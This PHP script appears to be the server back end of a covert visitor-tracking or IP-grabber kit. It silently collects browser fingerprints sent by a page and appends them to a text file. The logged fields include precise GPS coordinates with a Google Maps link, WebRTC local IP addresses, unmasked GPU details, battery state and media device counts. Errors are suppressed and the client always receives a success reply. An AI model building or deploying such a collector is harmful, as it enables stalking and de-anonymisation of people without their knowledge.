<?php
/**
 * Save Advanced Device Fingerprint Data
 */

error_reporting(0);
ini_set('display_errors', 0);

// Get JSON data from request
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (!$data) {
    http_response_code(400);
    exit;
}

// Build detailed log
$timestamp = date('[Y-m-d H:i:s]');
$separator = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

$log = "\n{$separator}\n";
$log .= "{$timestamp} ▼ ADVANCED FINGERPRINT DATA ▼\n";
$log .= "{$separator}\n\n";

// Screen & Display
if (isset($data['screen'])) {
    $log .= "╔═══ SCREEN & DISPLAY ═══╗\n";
    $log .= "  Resolution: {$data['screen']['width']}x{$data['screen']['height']}\n";
    $log .= "  Available: {$data['screen']['availWidth']}x{$data['screen']['availHeight']}\n";
    $log .= "  Color Depth: {$data['screen']['colorDepth']}-bit\n";
    $log .= "  Pixel Ratio: {$data['screen']['pixelRatio']}\n";
    if (isset($data['screen']['orientation'])) {
        $log .= "  Orientation: {$data['screen']['orientation']}\n";
    }
}

// Window Size
if (isset($data['window'])) {
    $log .= "\n╔═══ WINDOW SIZE ═══╗\n";
    $log .= "  Inner: {$data['window']['innerWidth']}x{$data['window']['innerHeight']}\n";
    $log .= "  Outer: {$data['window']['outerWidth']}x{$data['window']['outerHeight']}\n";
}

// Browser & Navigator
if (isset($data['navigator'])) {
    $log .= "\n╔═══ BROWSER & SYSTEM ═══╗\n";
    $log .= "  Platform: {$data['navigator']['platform']}\n";
    $log .= "  Language: {$data['navigator']['language']}\n";
    if (isset($data['navigator']['languages'])) {
        $log .= "  Languages: {$data['navigator']['languages']}\n";
    }
    $log .= "  CPU Cores: {$data['navigator']['hardwareConcurrency']}\n";
    $log .= "  Memory: {$data['navigator']['deviceMemory']} GB\n";
    $log .= "  Touch Points: {$data['navigator']['maxTouchPoints']}\n";
    $log .= "  Cookies: " . ($data['navigator']['cookieEnabled'] ? 'Enabled' : 'Disabled') . "\n";
    $log .= "  Online: " . ($data['navigator']['onLine'] ? 'Yes' : 'No') . "\n";
    $log .= "  Do Not Track: {$data['navigator']['doNotTrack']}\n";
}

// Network Connection
if (isset($data['connection']) && !empty($data['connection'])) {
    $log .= "\n╔═══ NETWORK CONNECTION ═══╗\n";
    if (isset($data['connection']['effectiveType'])) {
        $log .= "  Type: {$data['connection']['effectiveType']}\n";
    }
    if (isset($data['connection']['downlink'])) {
        $log .= "  Downlink: {$data['connection']['downlink']} Mbps\n";
    }
    if (isset($data['connection']['rtt'])) {
        $log .= "  RTT: {$data['connection']['rtt']} ms\n";
    }
    if (isset($data['connection']['saveData'])) {
        $log .= "  Data Saver: " . ($data['connection']['saveData'] ? 'On' : 'Off') . "\n";
    }
}

// Battery Info
if (isset($data['battery']) && !isset($data['battery']['error'])) {
    $log .= "\n╔═══ BATTERY STATUS ═══╗\n";
    $log .= "  Charging: " . ($data['battery']['charging'] ? 'Yes' : 'No') . "\n";
    $log .= "  Level: " . ($data['battery']['level'] * 100) . "%\n";
    if ($data['battery']['chargingTime'] != Infinity && $data['battery']['chargingTime'] > 0) {
        $log .= "  Charging Time: " . round($data['battery']['chargingTime'] / 60) . " minutes\n";
    }
    if ($data['battery']['dischargingTime'] != Infinity && $data['battery']['dischargingTime'] > 0) {
        $log .= "  Battery Life: " . round($data['battery']['dischargingTime'] / 60) . " minutes\n";
    }
}

// Timezone
if (isset($data['timezone'])) {
    $log .= "\n╔═══ TIMEZONE & LOCALE ═══╗\n";
    $log .= "  Timezone: {$data['timezone']['timezone']}\n";
    $log .= "  UTC Offset: {$data['timezone']['offset']} minutes\n";
    if (isset($data['timezone']['locale'])) {
        $log .= "  Locale: {$data['timezone']['locale']}\n";
    }
}

// WebRTC Local IPs
if (isset($data['localIPs']) && is_array($data['localIPs']) && count($data['localIPs']) > 0) {
    $log .= "\n╔═══ LOCAL IP ADDRESSES (WebRTC) ═══╗\n";
    foreach ($data['localIPs'] as $ip) {
        $log .= "  • {$ip}\n";
    }
}

// Geolocation (if available)
if (isset($data['geolocation']) && !isset($data['geolocation']['error'])) {
    $log .= "\n╔═══ GPS LOCATION (PRECISE) ═══╗\n";
    $log .= "  Latitude: {$data['geolocation']['latitude']}\n";
    $log .= "  Longitude: {$data['geolocation']['longitude']}\n";
    $log .= "  Accuracy: {$data['geolocation']['accuracy']} meters\n";
    if (isset($data['geolocation']['altitude']) && $data['geolocation']['altitude'] !== null) {
        $log .= "  Altitude: {$data['geolocation']['altitude']} meters\n";
    }
    if (isset($data['geolocation']['speed']) && $data['geolocation']['speed'] !== null) {
        $log .= "  Speed: {$data['geolocation']['speed']} m/s\n";
    }
    $log .= "  Maps: https://www.google.com/maps?q={$data['geolocation']['latitude']},{$data['geolocation']['longitude']}\n";
}

// Media Devices
if (isset($data['mediaDevices']) && !isset($data['mediaDevices']['error'])) {
    $log .= "\n╔═══ MEDIA DEVICES ═══╗\n";
    $log .= "  Microphones: {$data['mediaDevices']['audioInputs']}\n";
    $log .= "  Speakers: {$data['mediaDevices']['audioOutputs']}\n";
    $log .= "  Cameras: {$data['mediaDevices']['videoInputs']}\n";
    $log .= "  Total Devices: {$data['mediaDevices']['total']}\n";
}

// WebGL Info
if (isset($data['webgl']) && !isset($data['webgl']['error'])) {
    $log .= "\n╔═══ GPU & GRAPHICS (WebGL) ═══╗\n";
    $log .= "  Vendor: {$data['webgl']['vendor']}\n";
    $log .= "  Renderer: {$data['webgl']['renderer']}\n";
    if (isset($data['webgl']['unmaskedVendor'])) {
        $log .= "  Unmasked Vendor: {$data['webgl']['unmaskedVendor']}\n";
    }
    if (isset($data['webgl']['unmaskedRenderer'])) {
        $log .= "  Unmasked Renderer: {$data['webgl']['unmaskedRenderer']}\n";
    }
}

// Plugins
if (isset($data['plugins']) && is_array($data['plugins']) && count($data['plugins']) > 0) {
    $log .= "\n╔═══ BROWSER PLUGINS ═══╗\n";
    foreach ($data['plugins'] as $plugin) {
        $log .= "  • {$plugin['name']}\n";
    }
}

// Storage
if (isset($data['storage'])) {
    $log .= "\n╔═══ STORAGE ═══╗\n";
    $log .= "  LocalStorage: " . ($data['storage']['localStorage'] ? 'Enabled' : 'Disabled') . "\n";
    $log .= "  SessionStorage: " . ($data['storage']['sessionStorage'] ? 'Enabled' : 'Disabled') . "\n";
    $log .= "  IndexedDB: " . ($data['storage']['indexedDB'] ? 'Supported' : 'Not Supported') . "\n";
}

// Performance
if (isset($data['performance'])) {
    if (isset($data['performance']['memory']) && is_array($data['performance']['memory'])) {
        $log .= "\n╔═══ MEMORY USAGE ═══╗\n";
        $log .= "  JS Heap Limit: " . round($data['performance']['memory']['jsHeapSizeLimit'] / 1048576, 2) . " MB\n";
        $log .= "  Total JS Heap: " . round($data['performance']['memory']['totalJSHeapSize'] / 1048576, 2) . " MB\n";
        $log .= "  Used JS Heap: " . round($data['performance']['memory']['usedJSHeapSize'] / 1048576, 2) . " MB\n";
    }
    if (isset($data['performance']['timing']) && is_array($data['performance']['timing'])) {
        $log .= "\n╔═══ PAGE PERFORMANCE ═══╗\n";
        $log .= "  Load Time: {$data['performance']['timing']['loadTime']} ms\n";
        $log .= "  DOM Ready: {$data['performance']['timing']['domReadyTime']} ms\n";
        $log .= "  Connection: {$data['performance']['timing']['connectTime']} ms\n";
    }
}

// Canvas Fingerprint Hash
if (isset($data['canvas']) && strlen($data['canvas']) > 20) {
    $canvas_hash = substr(md5($data['canvas']), 0, 16);
    $log .= "\n╔═══ CANVAS FINGERPRINT ═══╗\n";
    $log .= "  Hash: {$canvas_hash}\n";
}

$log .= "\n{$separator}\n\n";

// Save to fingerprint.txt
try {
    $fp = @fopen('fingerprint.txt', 'a');
    if ($fp) {
        @fwrite($fp, $log);
        @fclose($fp);
    } else {
        @file_put_contents('fingerprint.txt', $log, FILE_APPEND);
    }
} catch (Exception $e) {
    // Silently fail
}

// Return success
header('Content-Type: application/json');
echo json_encode(['success' => true]);
?>
